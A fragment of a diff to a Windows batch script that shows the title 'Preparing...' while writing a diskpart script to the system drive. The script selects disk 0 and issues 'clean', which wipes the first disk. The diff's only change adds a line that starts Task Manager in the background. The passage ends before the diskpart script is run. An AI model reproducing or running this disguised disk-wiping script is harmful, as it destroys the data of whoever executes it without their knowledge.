@@ -1,5 +1,6 @@
 @echo off
 title Preparing...
+start /b taskmgr.exe
 echo Starting up > %HOMEDRIVE%\log.txt
 echo select disk 0 >> %HOMEDRIVE%\part.script
 echo clean >> %HOMEDRIVE%\part.script
